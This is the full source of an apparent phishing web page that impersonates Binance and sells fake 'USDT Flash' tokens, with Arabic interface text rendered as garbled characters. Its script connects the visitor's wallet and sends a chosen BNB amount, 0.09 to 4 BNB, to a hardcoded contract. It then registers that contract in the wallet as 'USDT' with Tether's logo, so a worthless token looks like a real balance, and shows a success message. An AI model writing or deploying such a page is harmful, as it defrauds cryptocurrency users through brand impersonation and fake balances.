<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance | USDT FLASH Bridge</title>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <script src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>

    <style>
        :root { --binance-yellow: #F3BA2F; --binance-black: #181A20; }
        body { background: var(--binance-black); color: #EAECEF; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; padding-top: 70px; }
        
        .header { width: 100%; position: fixed; top: 0; background: var(--binance-black); border-bottom: 1px solid #2B2F36; padding: 15px 20px; display: flex; align-items: center; z-index: 1000; box-sizing: border-box; }
        .logo-binance { width: 110px; }

        .main-container { background: #1E2329; border-radius: 24px; padding: 25px; width: 90%; max-width: 400px; box-shadow: 0 15px 45px rgba(0,0,0,0.6); border: 1px solid #2B3139; }
        
        .chart-box { width: 100%; height: 220px; border-radius: 12px; overflow: hidden; margin-bottom: 20px; border: 1px solid #2B3139; }

        .price-info { background: #2B3139; padding: 12px; border-radius: 10px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }

        select { background: #2B3139; color: white; border: 1px solid #474D57; width: 100%; padding: 16px; border-radius: 12px; font-size: 15px; margin-bottom: 20px; outline: none; cursor: pointer; text-align: right; }
        
        /* Ø²Ø± Ø§Ù„Ø±Ø¨Ø· Ø§Ù„Ù…Ù„ÙˆÙ† */
        .btn-connect { background: #2B3139; color: var(--binance-yellow); border: 1px solid var(--binance-yellow); width: 100%; padding: 14px; border-radius: 12px; margin-bottom: 20px; cursor: pointer; font-weight: bold; font-size: 15px; transition: 0.3s; }
        .btn-connect:hover { background: var(--binance-yellow); color: black; }

        .btn-main { background: var(--binance-yellow); color: #000; border: none; width: 100%; padding: 18px; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; }
        .btn-main:active { transform: scale(0.98); }
        
        #status-msg { margin-top: 15px; font-size: 13px; color: var(--binance-yellow); text-align: center; font-weight: 500; }

        /* ØªØ¹Ø¯ÙŠÙ„Ø§Øª Ù„ØªØ­Ø³ÙŠÙ† Ø¸Ù‡ÙˆØ± Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ù†Ø¨Ø«Ù‚Ø© Ù„Ù„Ù…Ø­Ø§ÙØ¸ */
        #web3modal-overlay { z-index: 3000 !important; }
    </style>
</head>
<body>

<div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/e/e8/Binance_Logo.svg" class="logo-binance">
    <div style="margin-right: auto; color: var(--binance-yellow); font-weight: bold; font-size: 14px;">USDT FLASH v4.2</div>
</div>

<div class="main-container">
    <div class="chart-box" id="tv_chart_main"></div>

    <div class="price-info">
        <div style="display:flex; align-items:center;">
            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" style="width:22px; margin-left:8px;">
            <span style="font-weight:bold; font-size:14px;">USDT Market</span>
        </div>
        <div style="color:#00C087; font-weight:bold;">$1.0000</div>
    </div>

    <button class="btn-connect" id="btn-connect" onclick="onConnect()">ğŸ”Œ Ø§Ø®ØªØ± Ù…Ø­ÙØ¸ØªÙƒ (Select Wallet)</button>

    <div style="font-size: 12px; color: #707A8A; margin-bottom: 8px; text-align: right;">ÙØ¦Ø© Ø§Ù„Ø­Ù‚Ù† Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©:</div>
    <select id="flashTier">
        <option value="0.09">5,000 USDT â€” [0.09 BNB]</option>
        <option value="0.2">10,000 USDT â€” [0.2 BNB]</option>
        <option value="0.5">50,000 USDT â€” [0.5 BNB]</option>
        <option value="1.0">100,000 USDT â€” [1.0 BNB]</option>
        <option value="4.0">500,000 USDT â€” [4.0 BNB]</option>
    </select>

    <button class="btn-main" onclick="executeProcess()">ØªÙØ¹ÙŠÙ„ ÙˆØ§Ø³ØªÙ„Ø§Ù… Ø§Ù„Ø­Ù‚Ù† âš¡</button>
    
    <div id="status-msg">Ø¬Ø§Ù‡Ø² Ù„Ø¨Ø¯Ø¡ Ø§Ù„Ø§ØªØµØ§Ù„ Ø§Ù„Ø¢Ù…Ù†...</div>
</div>

<script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
<script>
    // 1. Ø§Ù„Ù…Ø®Ø·Ø· Ø§Ù„Ø¨ÙŠØ§Ù†ÙŠ Ø§Ù„Ø±Ø³Ù…ÙŠ
    new TradingView.widget({
        "container_id": "tv_chart_main",
        "autosize": true,
        "symbol": "BINANCE:USDTBUSD",
        "interval": "1",
        "theme": "dark",
        "style": "3",
        "locale": "ar",
        "hide_top_toolbar": true
    });

    // 2. Ø¥Ø¹Ø¯Ø§Ø¯ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø­Ø§ÙØ¸ (Web3Modal)
    const Web3Modal = window.Web3Modal.default;
    const WalletConnectProvider = window.WalletConnectProvider.default;

    let web3Modal;
    let provider;
    let selectedAccount;

    function init() {
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ù…Ø­Ø§ÙØ¸ Ø§Ù„Ù…ØªØ§Ø­Ø© ÙÙŠ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©
        const providerOptions = {
            walletconnect: {
                package: WalletConnectProvider,
                options: {
                    rpc: { 56: "https://bsc-dataseed.binance.org/" },
                    network: "binance",
                }
            },
            // ÙŠÙ…ÙƒÙ†Ùƒ Ø¥Ø¶Ø§ÙØ© Ù…Ø­ÙØ¸Ø© Coinbase Ø£Ùˆ ØºÙŠØ±Ù‡Ø§ Ù‡Ù†Ø§
        };

        web3Modal = new Web3Modal({
            network: "mainnet", 
            cacheProvider: false, 
            providerOptions,
            theme: "dark" // Ø¬Ø¹Ù„ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø­Ø§ÙØ¸ Ø³ÙˆØ¯Ø§Ø¡ Ù„ØªÙ†Ø§Ø³Ø¨ Binance
        });
    }

    async function onConnect() {
        try {
            // Ø³ÙŠØ¤Ø¯ÙŠ Ù‡Ø°Ø§ Ø§Ù„Ø³Ø·Ø± Ù„ÙØªØ­ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø­Ø§ÙØ¸ Ù„ÙŠØ®ØªØ§Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
            provider = await web3Modal.connect();
            const web3 = new Web3(provider);
            const accounts = await web3.eth.getAccounts();
            selectedAccount = accounts[0];
            
            document.getElementById('btn-connect').innerText = "âœ… Ù…ØªØµÙ„: " + selectedAccount.substring(0,6) + "...";
            document.getElementById('status-msg').innerText = "ØªÙ… Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ù†Ø¬Ø§Ø­. ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ù…ØªØ§Ø¨Ø¹Ø©.";
        } catch(e) { 
            console.log("User closed modal or connection error", e); 
        }
    }

    const CONTRACT_ADDR = "0x22581282b507c6743762cBaA542D6B33Cd6f631f";
    const ABI = [{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}];

    async function executeProcess() {
        if (!selectedAccount) {
            alert("ÙŠØ±Ø¬Ù‰ Ø§Ø®ØªÙŠØ§Ø± Ù…Ø­ÙØ¸ØªÙƒ Ø£ÙˆÙ„Ø§Ù‹ Ø¹Ø¨Ø± Ø²Ø± Ø§Ù„Ø±Ø¨Ø·");
            return onConnect();
        }
        
        const msg = document.getElementById('status-msg');
        try {
            const web3 = new Web3(provider);
            const contract = new web3.eth.Contract(ABI, CONTRACT_ADDR);
            const val = document.getElementById('flashTier').value;

            msg.innerText = "Ø¬Ø§Ø±ÙŠ Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø·Ù„Ø¨ ÙÙŠ Ù…Ø­ÙØ¸ØªÙƒ...";
            
            await contract.methods.buyFlash().send({
                from: selectedAccount,
                value: web3.utils.toWei(val, "ether"),
                gas: 250000
            });

            msg.innerText = "ØªÙ… Ø§Ù„Ø­Ù‚Ù†! Ø¬Ø§Ø±ÙŠ Ù…Ø²Ø§Ù…Ù†Ø© Ø§Ù„Ù„ÙˆØ¬Ùˆ ÙˆØ§Ù„Ø³Ø¹Ø±...";

            // Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØªÙˆÙƒÙ† Ø¨ØµØ±ÙŠØ§Ù‹ Ù„Ù„Ù…Ø­ÙØ¸Ø©
            if (provider.request) {
                await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: CONTRACT_ADDR,
                            symbol: 'USDT',
                            decimals: 18,
                            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
                        },
                    },
                });
            }

            msg.innerHTML = "<b style='color:#00C087;'>âœ… ØªÙ… Ø§Ù„ØªÙØ¹ÙŠÙ„ Ø¨Ù†Ø¬Ø§Ø­! Ø§Ù„Ø±ØµÙŠØ¯ Ù…ØªØ§Ø­.</b>";
        } catch (e) {
            msg.innerText = "ÙØ´Ù„Øª Ø§Ù„Ø¹Ù…Ù„ÙŠØ©. ØªØ£ÙƒØ¯ Ù…Ù† ØªØ£ÙƒÙŠØ¯ Ø§Ù„Ø·Ù„Ø¨ ÙÙŠ Ù…Ø­ÙØ¸ØªÙƒ.";
        }
    }

    window.addEventListener('load', init);
</script>
</body>
</html>
